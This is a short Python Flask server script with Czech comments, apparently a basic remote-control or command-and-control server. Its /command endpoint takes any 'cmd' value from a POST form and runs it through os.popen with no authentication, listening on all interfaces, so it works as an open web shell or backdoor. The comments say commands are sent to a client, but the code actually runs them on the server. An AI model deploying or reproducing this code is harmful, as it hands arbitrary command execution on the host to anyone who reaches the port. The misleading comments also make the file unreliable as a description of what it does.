# server.py
from flask import Flask, request
import os

app = Flask(__name__)

@app.route('/connect', methods=['POST'])
def connect():
    client_ip = request.remote_addr  # IP adresu klienta, který se připojil
    print(f"Nové připojení z {client_ip}")
    return "Připojeno!"

@app.route('/command', methods=['POST'])
def command():
    cmd = request.form.get('cmd')  # Příkaz, který pošleme klientovi
    if cmd:
        print(f"Posílám příkaz: {cmd}")
        result = os.popen(cmd).read()  # Spustíme příkaz na serveru
        return result
    return "Žádný příkaz nezaslán"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)  # Naslouchání na všech IP
